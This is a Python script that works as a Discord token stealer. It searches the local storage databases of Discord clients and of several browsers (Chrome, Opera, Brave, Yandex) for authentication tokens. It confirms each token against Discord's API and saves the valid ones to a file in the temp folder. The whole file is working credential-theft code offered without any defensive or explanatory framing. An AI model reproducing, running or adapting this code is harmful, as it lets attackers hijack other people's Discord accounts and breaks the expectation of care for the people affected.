import os
import re
import json
import tempfile
import requests

def is_valid_token(token):
    headers = {
        'Authorization': token
    }
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    return response.status_code == 200

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    if token not in tokens and is_valid_token(token):  # Check for duplicates and validate token
                        tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    tokens = []

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens.extend(find_tokens(path))

    tokens = list(set(tokens))  # Remove duplicates

    valid_tokens = []

    for token in tokens:
        if is_valid_token(token):
            valid_tokens.append(token)

    output = ''
    if len(valid_tokens) > 0:
        output += 'Discord Token:\n```\n'
        for token in valid_tokens:
            output += f'{token}\n'
        output += '```'
    else:
        output += 'No valid tokens found.'

    temp_folder = tempfile.gettempdir()
    output_file = os.path.join(temp_folder, 'discord_token.txt')

    with open(output_file, 'w') as file:
        file.write(output)

if __name__ == '__main__':
    main()
